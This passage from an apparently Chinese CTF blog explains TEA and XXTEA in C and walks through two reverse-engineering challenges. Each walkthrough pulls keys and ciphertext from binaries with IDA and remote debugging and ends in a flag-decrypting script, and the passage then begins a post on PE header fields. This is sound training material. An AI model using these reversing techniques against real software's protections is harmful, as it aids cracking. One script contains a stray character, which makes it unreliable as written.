v[<span class="number">1</span>]=v1;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">decipher</span><span class="params">(<span class="type">unsigned</span> <span class="type">int</span> num_rounds, <span class="type">uint32_t</span> v[<span class="number">2</span>], <span class="type">uint32_t</span> <span class="type">const</span> key[<span class="number">4</span>])</span> </span>&#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> i;</span><br><span class="line">    <span class="type">uint32_t</span> v0=v[<span class="number">0</span>], v1=v[<span class="number">1</span>], delta=<span class="number">0x9E3779B9</span>, sum=delta*num_rounds;</span><br><span class="line">    <span class="keyword">for</span> (i=<span class="number">0</span>; i &lt; num_rounds; i++) &#123;</span><br><span class="line">        v1 -= (((v0 &lt;&lt; <span class="number">4</span>) ^ (v0 &gt;&gt; <span class="number">5</span>)) + v0) ^ (sum + key[(sum&gt;&gt;<span class="number">11</span>) &amp; <span class="number">3</span>]);</span><br><span class="line">        sum -= delta;</span><br><span class="line">        v0 -= (((v1 &lt;&lt; <span class="number">4</span>) ^ (v1 &gt;&gt; <span class="number">5</span>)) + v1) ^ (sum + key[sum &amp; <span class="number">3</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">    v[<span class="number">0</span>]=v0; v[<span class="number">1</span>]=v1;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">uint32_t</span> v[<span class="number">2</span>]=&#123;<span class="number">1</span>,<span class="number">2</span>&#125;;</span><br><span class="line">    <span class="type">uint32_t</span> <span class="type">const</span> k[<span class="number">4</span>]=&#123;<span class="number">2</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>&#125;;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> r=<span class="number">32</span>;<span class="comment">//num_rounds建议取值为32</span></span><br><span class="line">    <span class="comment">// v为要加密的数据是两个32位无符号整数</span></span><br><span class="line">    <span class="comment">// k为加密解密密钥，为4个32位无符号整数，即密钥长度为128位</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;加密前原始数据：%u %u\n&quot;</span>,v[<span class="number">0</span>],v[<span class="number">1</span>]);</span><br><span class="line">    <span class="built_in">encipher</span>(r, v, k);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;加密后的数据：%u %u\n&quot;</span>,v[<span class="number">0</span>],v[<span class="number">1</span>]);</span><br><span class="line">    <span class="built_in">decipher</span>(r, v, k);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;解密后的数据：%u %u\n&quot;</span>,v[<span class="number">0</span>],v[<span class="number">1</span>]);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="xxTEA"><a href="#xxTEA" class="headerlink" title="xxTEA"></a>xxTEA</h2><p>XXtea 算法的基本原理是将明文分成若干个固定长度的块，然后对每个块进行加密。加密过程中，使用一个密钥对每个块进行加密，然后将加密后的块拼接在一起形成密文。<br>解密过程与加密过程相反。使用相同的密钥对密文进行解密，然后将解密后的块拼接在一起形成明文。</p><p><img src="https://hesiy-md-pic.oss-cn-beijing.aliyuncs.com/images/24summer/tea/xxtea.png" alt="xxtea"></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DELTA 0x9e3779b9</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MX (((z&gt;&gt;5^y<span class="string">&lt;&lt;2) + (y&gt;</span>&gt;3^z&lt;&lt;4)) ^ ((sum^y) + (key[(p&amp;3)^e] ^ z)))</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">btea</span><span class="params">(<span class="type">uint32_t</span> *v, <span class="type">int</span> n, <span class="type">uint32_t</span> <span class="type">const</span> key[<span class="number">4</span>])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">uint32_t</span> y, z, sum;</span><br><span class="line">    <span class="type">unsigned</span> p, rounds, e;</span><br><span class="line">    <span class="keyword">if</span> (n &gt; <span class="number">1</span>)            <span class="comment">/* Coding Part */</span></span><br><span class="line">    &#123;</span><br><span class="line">        rounds = <span class="number">6</span> + <span class="number">52</span>/n;</span><br><span class="line">        sum = <span class="number">0</span>;</span><br><span class="line">        z = v[n<span class="number">-1</span>];</span><br><span class="line">        <span class="keyword">do</span></span><br><span class="line">        &#123;</span><br><span class="line">            sum += DELTA;</span><br><span class="line">            e = (sum &gt;&gt; <span class="number">2</span>) &amp; <span class="number">3</span>;</span><br><span class="line">            <span class="keyword">for</span> (p=<span class="number">0</span>; p&lt;n<span class="number">-1</span>; p++)</span><br><span class="line">            &#123;</span><br><span class="line">                y = v[p+<span class="number">1</span>];</span><br><span class="line">                z = v[p] += MX;</span><br><span class="line">            &#125;</span><br><span class="line">            y = v[<span class="number">0</span>];</span><br><span class="line">            z = v[n<span class="number">-1</span>] += MX;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">while</span> (--rounds);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (n &lt; <span class="number">-1</span>)      <span class="comment">/* Decoding Part */</span></span><br><span class="line">    &#123;</span><br><span class="line">        n = -n;</span><br><span class="line">        rounds = <span class="number">6</span> + <span class="number">52</span>/n;</span><br><span class="line">        sum = rounds*DELTA;</span><br><span class="line">        y = v[<span class="number">0</span>];</span><br><span class="line">        <span class="keyword">do</span></span><br><span class="line">        &#123;</span><br><span class="line">            e = (sum &gt;&gt; <span class="number">2</span>) &amp; <span class="number">3</span>;</span><br><span class="line">            <span class="keyword">for</span> (p=n<span class="number">-1</span>; p&gt;<span class="number">0</span>; p--)</span><br><span class="line">            &#123;</span><br><span class="line">                z = v[p<span class="number">-1</span>];</span><br><span class="line">                y = v[p] -= MX;</span><br><span class="line">            &#125;</span><br><span class="line">            z = v[n<span class="number">-1</span>];</span><br><span class="line">            y = v[<span class="number">0</span>] -= MX;</span><br><span class="line">            sum -= DELTA;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">while</span> (--rounds);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">uint32_t</span> v[<span class="number">2</span>]= &#123;<span class="number">1</span>,<span class="number">2</span>&#125;;</span><br><span class="line">    <span class="type">uint32_t</span> <span class="type">const</span> k[<span class="number">4</span>]= &#123;<span class="number">2</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>&#125;;</span><br><span class="line">    <span class="type">int</span> n= <span class="number">2</span>; <span class="comment">//n的绝对值表示v的长度，取正表示加密，取负表示解密</span></span><br><span class="line">    <span class="comment">// v为要加密的数据是两个32位无符号整数</span></span><br><span class="line">    <span class="comment">// k为加密解密密钥，为4个32位无符号整数，即密钥长度为128位</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;加密前原始数据：%u %u\n&quot;</span>,v[<span class="number">0</span>],v[<span class="number">1</span>]);</span><br><span class="line">    <span class="built_in">btea</span>(v, n, k);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;加密后的数据：%u %u\n&quot;</span>,v[<span class="number">0</span>],v[<span class="number">1</span>]);</span><br><span class="line">    <span class="built_in">btea</span>(v, -n, k);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;解密后的数据：%u %u\n&quot;</span>,v[<span class="number">0</span>],v[<span class="number">1</span>]);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h1><h2 id="【xxtea】happytime-elf（同时也练一下监听调试）"><a href="#【xxtea】happytime-elf（同时也练一下监听调试）" class="headerlink" title="【xxtea】happytime.elf（同时也练一下监听调试）"></a>【xxtea】happytime.elf（同时也练一下监听调试）</h2><p>监听前置工作：</p><p>将 ida 中的 linux_server64 拖入到 linux 中</p><p>拖入后 chmod + x linux_server64 chmod +x 你的待调试文件名给予权限</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ifconfig 查询ip</span><br><span class="line">./linux_server64进行监听</span><br></pre></td></tr></table></figure><p>查克无壳 ida</p><p><img src="https://hesiy-md-pic.oss-cn-beijing.aliyuncs.com/images/24summer/tea/happytime01.png" alt="happytime01"></p><p>跟进 cry</p><p><img src="https://hesiy-md-pic.oss-cn-beijing.aliyuncs.com/images/24summer/tea/happytime-cry.png" alt="happytime-cry"></p><p>发现是 xxtea，找了一个 xxtea 的算法模板进行相关修改</p><p>那么第一个图的 v5 就是 key，v6 就是密文</p><p>这里直接用轮数会出问题所以用了下动调直接将加密后轮数得出</p><p><img src="https://hesiy-md-pic.oss-cn-beijing.aliyuncs.com/images/24summer/tea/%E5%81%B7%E6%87%92%E5%8A%A8%E8%B0%83.jpg" alt="偷懒动调"></p><p>exp</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DELTA 0x61C88647</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MX ( ( (z&gt;&gt;5^y<span class="string">&lt;&lt;2) + (y&gt;</span>&gt;3^z&lt;&lt;4) ) ^ ( (sum^y) + (key[(p&amp;3)^e] ^ z) ) )</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">btea</span><span class="params">(<span class="type">uint32_t</span> *v, <span class="type">int</span> n, <span class="type">uint32_t</span> <span class="type">const</span> key[<span class="number">4</span>])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">uint32_t</span> y, z, sum;</span><br><span class="line">    <span class="type">unsigned</span> p, rounds, e;</span><br><span class="line">    <span class="keyword">if</span> (n &gt; <span class="number">1</span>)            <span class="comment">/* Coding Part */</span></span><br><span class="line">    &#123;</span><br><span class="line">        rounds = <span class="number">415</span> / n + <span class="number">114</span>;</span><br><span class="line">        sum = <span class="number">0</span>;</span><br><span class="line">        z = v[n<span class="number">-1</span>];</span><br><span class="line">        <span class="keyword">do</span></span><br><span class="line">        &#123;</span><br><span class="line">            sum -= DELTA;</span><br><span class="line">            e = (sum &gt;&gt; <span class="number">2</span>) &amp; <span class="number">3</span>;</span><br><span class="line">            <span class="keyword">for</span> (p=<span class="number">0</span>; p&lt;n<span class="number">-1</span>; p++)</span><br><span class="line">            &#123;</span><br><span class="line">                y = v[p+<span class="number">1</span>];</span><br><span class="line">                z = v[p] += MX;</span><br><span class="line">            &#125;</span><br><span class="line">            y = v[<span class="number">0</span>];</span><br><span class="line">            z = v[n<span class="number">-1</span>] += MX;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">while</span> (--rounds);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (n &lt; <span class="number">-1</span>)      <span class="comment">/* Decoding Part */</span></span><br><span class="line">    &#123;</span><br><span class="line">        n = -n;</span><br><span class="line">        rounds = <span class="number">415</span> / n + <span class="number">114</span>;</span><br><span class="line">        sum =  <span class="number">0x52b8cc1f</span>;<span class="comment">//rounds*DELTA;</span></span><br><span class="line">        y = v[<span class="number">0</span>];</span><br><span class="line">        <span class="keyword">do</span></span><br><span class="line">        &#123;</span><br><span class="line">            e = (sum &gt;&gt; <span class="number">2</span>) &amp; <span class="number">3</span>;</span><br><span class="line">            <span class="keyword">for</span> (p=n<span class="number">-1</span>; p&gt;<span class="number">0</span>; p--)</span><br><span class="line">            &#123;</span><br><span class="line">                z = v[p<span class="number">-1</span>];</span><br><span class="line">                y = v[p] -= MX;</span><br><span class="line">            &#125;</span><br><span class="line">            z = v[n<span class="number">-1</span>];</span><br><span class="line">            y = v[<span class="number">0</span>] -= MX;</span><br><span class="line">            sum += DELTA;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">while</span> (--rounds);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">uint32_t</span> v[<span class="number">11</span>]= &#123;<span class="number">0x480AC20C</span>,<span class="number">0xCE9037F2</span>,<span class="number">0x8C212018</span>,<span class="number">0xE92A18D</span>,<span class="number">0xA4035274</span>,<span class="number">0x2473AAB1</span>,<span class="number">0xA9EFDB58</span>,<span class="number">0xA52CC5C8</span>,<span class="number">0xE432CB51</span>,<span class="number">0xD04E9223</span>,<span class="number">0x6FD07093</span>&#125;;</span><br><span class="line">    <span class="type">uint32_t</span> <span class="type">const</span> k[<span class="number">4</span>]= &#123;<span class="number">0x79696755</span>,<span class="number">0x67346F6C</span>,<span class="number">0x69231231</span>,<span class="number">0x5F674231</span>&#125;;</span><br><span class="line">    <span class="type">int</span> n= <span class="number">11</span>;</span><br><span class="line">   <span class="comment">// btea(v, n, k);</span></span><br><span class="line">   <span class="comment">//printf(&quot;0x%0x&quot;,k[3]);</span></span><br><span class="line">    <span class="built_in">btea</span>(v, -n, k);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>,v);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="【xxtea】-NewStarCTF-公开赛赛道-EzTea"><a href="#【xxtea】-NewStarCTF-公开赛赛道-EzTea" class="headerlink" title="【xxtea】[NewStarCTF 公开赛赛道]EzTea"></a>【xxtea】[NewStarCTF 公开赛赛道]EzTea</h2><p>可以看看这位师傅的 blog：<a href="https://www.cnblogs.com/Only-xiaoxiao/p/16759891.html">https://www.cnblogs.com/Only-xiaoxiao/p/16759891.html</a></p><p>查克无壳 ida</p><p><img src="https://hesiy-md-pic.oss-cn-beijing.aliyuncs.com/images/24summer/tea/newstarCtf01.png" alt="newstarCtf01"></p><p>这是将输入的字符串进行加密后与预定密文比对，</p><p>跟进查看 sub_140011c0</p><p><img src="https://hesiy-md-pic.oss-cn-beijing.aliyuncs.com/images/24summer/tea/newstarCtf02.png" alt="newstarCtf02"></p><p>发现还是 xxtea</p><p>回到前面跟进查看 unk_140004038 获得 key</p><p>查看 dword_140004038 获得密文</p><p>exp</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DELTA 0x11451400</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MX (((z ^ (key[(e ^ p) &amp; 3])) + (y ^ sum)) ^ (((32 * z) ^ (y &gt;&gt; 3)) + ((4 * y) ^ (z &gt;&gt; 4))))</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">btea</span><span class="params">(<span class="type">uint32_t</span> *v, <span class="type">int</span> n, <span class="type">uint32_t</span> <span class="type">const</span> key[<span class="number">4</span>])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">uint32_t</span> y, z, sum;</span><br><span class="line">    <span class="type">unsigned</span> p, rounds, e;</span><br><span class="line">    <span class="keyword">if</span> (n &gt; <span class="number">1</span>)            <span class="comment">/* Coding Part */</span></span><br><span class="line">    &#123;</span><br><span class="line">        rounds = <span class="number">6</span> + <span class="number">52</span> / n ;</span><br><span class="line">        sum = <span class="number">0</span>;</span><br><span class="line">        z = v[n<span class="number">-1</span>];</span><br><span class="line">        <span class="keyword">do</span></span><br><span class="line">        &#123;</span><br><span class="line">            sum += DELTA;A</span><br><span class="line">            e = (sum &gt;&gt; <span class="number">2</span>) &amp; <span class="number">3</span>;</span><br><span class="line">            <span class="keyword">for</span> (p=<span class="number">0</span>; p&lt;n<span class="number">-1</span>; p++)</span><br><span class="line">            &#123;</span><br><span class="line">                y = v[p+<span class="number">1</span>];</span><br><span class="line">                z = v[p] += MX;</span><br><span class="line">            &#125;</span><br><span class="line">            y = v[<span class="number">0</span>];</span><br><span class="line">            z = v[n<span class="number">-1</span>] += MX;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">while</span> (--rounds);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (n &lt; <span class="number">-1</span>)      <span class="comment">/* Decoding Part */</span></span><br><span class="line">    &#123;</span><br><span class="line">     n = -n;</span><br><span class="line">        rounds = <span class="number">6</span> + <span class="number">52</span> / n ;</span><br><span class="line">        sum =  rounds*DELTA;<span class="comment">/*0xbdf7dc00*/</span>;</span><br><span class="line">        <span class="comment">//这次可以用round*常数，也可以动调</span></span><br><span class="line">        y = v[<span class="number">0</span>];</span><br><span class="line">        <span class="keyword">do</span></span><br><span class="line">        &#123;</span><br><span class="line">            e = (sum &gt;&gt; <span class="number">2</span>) &amp; <span class="number">3</span>;</span><br><span class="line">            <span class="keyword">for</span> (p=n<span class="number">-1</span>; p&gt;<span class="number">0</span>; p--)</span><br><span class="line">            &#123;</span><br><span class="line">                z = v[p<span class="number">-1</span>];</span><br><span class="line">                y = v[p] -= MX;</span><br><span class="line">            &#125;</span><br><span class="line">            z = v[n<span class="number">-1</span>];</span><br><span class="line">            y = v[<span class="number">0</span>] -= MX;</span><br><span class="line">            sum -= DELTA;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">while</span> (--rounds);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">uint32_t</span> v[<span class="number">9</span>]= &#123;<span class="number">0x38FA8A82</span>, <span class="number">0x0D7501380</span>, <span class="number">0x0E40969D</span>, <span class="number">0x4E169120</span>, <span class="number">0x713A29AB</span>, <span class="number">0x6CE5393D</span>, <span class="number">0x0B69D752E</span>, <span class="number">0x841A88E6</span>, <span class="number">0x6F31B459</span>&#125;;</span><br><span class="line">    <span class="type">uint32_t</span> <span class="type">const</span> k[<span class="number">4</span>]= &#123;<span class="number">0x19</span>,<span class="number">0x19</span>,<span class="number">0x08</span>,<span class="number">0x10</span>&#125;;</span><br><span class="line">    <span class="type">int</span> n= <span class="number">9</span>;</span><br><span class="line">   <span class="comment">// btea(v, n, k); //鍔犲瘑</span></span><br><span class="line">   <span class="comment">//printf(&quot;0x%0x&quot;,k[3]);</span></span><br><span class="line">    <span class="built_in">btea</span>(v, -n, k);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>,v);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="大佬们文章与视频，去看看有助于理解"><a href="#大佬们文章与视频，去看看有助于理解" class="headerlink" title="大佬们文章与视频，去看看有助于理解"></a>大佬们文章与视频，去看看有助于理解</h1><p>csdn：（这两我建议配着看）</p><p>1.<a href="https://blog.csdn.net/m0_73393932/article/details/130094306?ops_request_misc=&request_id=&biz_id=102&utm_term=tea%E7%AE%97%E6%B3%95&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduweb~default-1-130094306.142">https://blog.csdn.net/m0_73393932/article/details/130094306?ops_request_misc=&amp;request_id=&amp;biz_id=102&amp;utm_term=tea%E7%AE%97%E6%B3%95&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduweb~default-1-130094306.142</a></p><p>2.<a href="https://blog.csdn.net/xiao__1bai/article/details/123307059">https://blog.csdn.net/xiao__1bai/article/details/123307059</a></p><p>b 站：(第一个视频没有更新到 xxtea 的动画演示理解，第二个 up 麦比较炸)<br>【【动画密码学】TEA(Tiny Encryption Algorithm)|分组加密】 <a href="https://www.bilibili.com/video/BV1Nu411E7wX/?share_source=copy_web&vd_source=86d6e63e560e68bb720088caa831e036">https://www.bilibili.com/video/BV1Nu411E7wX/?share_source=copy_web&amp;vd_source=86d6e63e560e68bb720088caa831e036</a></p><p>【VTuber 深入浅出应用密码学 7-2-1 XTEA 算法 C++代码 对称密码 块密码 分组密码 信息安全】 <a href="https://www.bilibili.com/video/BV1zF411U7ap/?share_source=copy_web&vd_source=86d6e63e560e68bb720088caa831e036">https://www.bilibili.com/video/BV1zF411U7ap/?share_source=copy_web&amp;vd_source=86d6e63e560e68bb720088caa831e036</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>【PE】DOS头-PE头-节表属性说明</title>
      <link href="/2024/07/11/dos-pe-%E8%8A%82%E8%A1%A8%E5%B1%9E%E6%80%A7/"/>
      <url>/2024/07/11/dos-pe-%E8%8A%82%E8%A1%A8%E5%B1%9E%E6%80%A7/</url>
      
        <content type="html"><![CDATA[<h1 id="DOS头-PE头-节表属性说明"><a href="#DOS头-PE头-节表属性说明" class="headerlink" title="DOS头-PE头-节表属性说明"></a>DOS头-PE头-节表属性说明</h1><h2 id="DOS头"><a href="#DOS头" class="headerlink" title="DOS头"></a>DOS头</h2><p>dos头由DOS-MZ文件头和DOS块组成</p><h4 id="DOS-MZ文件头"><a href="#DOS-MZ文件头" class="headerlink" title="DOS-MZ文件头"></a>DOS-MZ文件头</h4><p>（下图是16位程序的表，现在已经不用这个结构体）</p><p>&#x3D;&#x3D;<strong>！！！红色结构体成员仍在使用！！！</strong>&#x3D;&#x3D;</p><p><strong>中间黑色成员部分可以随意改动不影响程序的运行</strong></p><p><img src="https://hesiy-md-pic.oss-cn-beijing.aliyuncs.com/images/pe/%20heads/DOS-MZ%E7%BB%93%E6%9E%84%E4%BD%93.png" alt="DOS-MZ结构体"></p><p><strong>最后的结构体是计算机查找pe头所在的地址因此也不能随意更改</strong></p><h4 id="DOS块"><a href="#DOS块" class="headerlink" title="DOS块"></a>DOS块</h4><p>处于DOS-MZ头与标准PE头的中间，一般由连接器填充，可以干些猥琐事情</p><p><strong>这块数据可以随意更改不影响程序运行</strong></p><h2 id="PE文件头"><a href="#PE文件头" class="headerlink" title="PE文件头"></a>PE文件头</h2><p>下图是pe结构体</p><p><img src="https://hesiy-md-pic.oss-cn-beijing.aliyuncs.com/images/pe/%20heads/pe%E5%A4%B4%E7%BB%93%E6%9E%84%E4%BD%93.png" alt="pe头结构体"></p><p>一个程序的主要重要数据全在标准PE头和扩展PE头中</p><h4 id="PE标识"><a href="#PE标识" class="headerlink" title="PE标识"></a>PE标识</h4><p>占用4字节</p><p>PE标识<strong>不能更改</strong>，程序会检测PE标识是否是正确的值</p><h4 id="标准PE头"><a href="#标准PE头" class="headerlink" title="标准PE头"></a>标准PE头</h4><p>占用20个字节</p><p><img src="https://hesiy-md-pic.oss-cn-beijing.aliyuncs.com/images/pe/%20heads/%E6%A0%87%E5%87%86PE%E5%A4%B4%E7%BB%93%E6%9E%84%E4%BD%93.png" alt="标准PE头结构体"></p><p><strong>Machine</strong>标识当前这个程序运行在什么样的cpu型号上</p><p><strong>NumberOfSections</strong>记录当前的PE文件有多少个节</p><p><strong>TImeDataStamp</strong>是从1970年0时0分0秒开始到编译器编译当前程序的时候</p><p>PointerToSymbolTable，NumberOfSymbols与调试相关</p><p><strong>SizeOfOptionalHeader</strong>扩展PE头的大小，默认情况32位是0xE0，64位是0xf0</p><p><strong>Characteristics</strong>表示文件属性，要把该位的16进制转换成2进制，转换成的二进制每一位都有其含义</p><p><img src="https://hesiy-md-pic.oss-cn-beijing.aliyuncs.com/images/pe/%20heads/characteristics%E5%90%AB%E4%B9%89%E8%A1%A8.png" alt="characteristics含义表"></p><p>哪位为1，哪位就有相应含义，</p><p><strong>位数是从零开始。从右向左位数递增</strong></p><p>例如0x0026转换成二进制是0000 0000 0010 0110</p><p>其含义是文件是可执行的；不存在行信息；应用程序可处理大于2GB的地址</p><h4 id="扩展PE头"><a href="#扩展PE头" class="headerlink" title="扩展PE头"></a>扩展PE头</h4><p>占用224个字节</p><p><img src="https://hesiy-md-pic.oss-cn-beijing.aliyuncs.com/images/pe/%20heads/%E6%89%A9%E5%B1%95PE%E5%A4%B4%E7%BB%93%E6%9E%84%E4%BD%93-32-02.png" alt="扩展pe头结构体"></p><p>32位和64位的结构体中最后一个子结构体会不同，</p><p>64位会比32位少几个成员，还有部分成员变成85字节</p><p>先以32位结构体位基准</p><p><img 